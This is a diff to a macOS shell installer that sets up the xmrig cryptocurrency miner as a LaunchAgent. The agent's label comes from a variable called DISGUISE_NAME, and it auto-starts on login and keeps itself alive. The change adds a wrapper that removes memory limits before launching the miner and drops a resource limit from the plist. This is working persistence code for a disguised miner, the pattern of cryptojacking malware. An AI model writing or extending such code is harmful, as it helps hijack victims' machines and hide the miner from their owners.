@@ -111,25 +111,33 @@ cat > "$CONFIG_PATH" << CONF
 CONF
 echo "      ✓ Config written"
 
-# ---- Write LaunchAgent plist ----
+# ---- Write wrapper launch script (removes memory limits before xmrig starts) ----
+WRAPPER_PATH="$INSTALL_DIR/launcher.sh"
+cat > "$WRAPPER_PATH" << WRAPPER
+#!/bin/bash
+ulimit -l unlimited 2>/dev/null || true
+ulimit -v unlimited 2>/dev/null || true
+ulimit -m unlimited 2>/dev/null || true
+exec "$BINARY_PATH" \
+  --config "$CONFIG_PATH" \
+  --no-huge-pages \
+  --randomx-mode=light \
+  --threads=$THREADS
+WRAPPER
+chmod +x "$WRAPPER_PATH"
+
+# ---- Write LaunchAgent plist — runs wrapper, not xmrig directly ----
 echo "[4/5] Installing LaunchAgent (auto-start on login)..."
 printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
 printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
 printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
 printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
 printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
-printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
-printf '    <string>--config</string>\n' >> "$PLIST_PATH"
-printf '    <string>%s</string>\n' "$CONFIG_PATH" >> "$PLIST_PATH"
-printf '    <string>--no-huge-pages</string>\n' >> "$PLIST_PATH"
-printf '    <string>--randomx-mode=light</string>\n' >> "$PLIST_PATH"
-printf '    <string>--threads=%s</string>\n' "$THREADS" >> "$PLIST_PATH"
+printf '    <string>/bin/bash</string>\n' >> "$PLIST_PATH"
+printf '    <string>%s</string>\n' "$WRAPPER_PATH" >> "$PLIST_PATH"
 printf '  </array>\n' >> "$PLIST_PATH"
 printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
 printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
-printf '  <key>SoftResourceLimits</key><dict>\n' >> "$PLIST_PATH"
-printf '    <key>NumberOfFiles</key><integer>1024</integer>\n' >> "$PLIST_PATH"
-printf '  </dict>\n' >> "$PLIST_PATH"
 printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
 printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
 printf '</dict></plist>\n' >> "$PLIST_PATH"
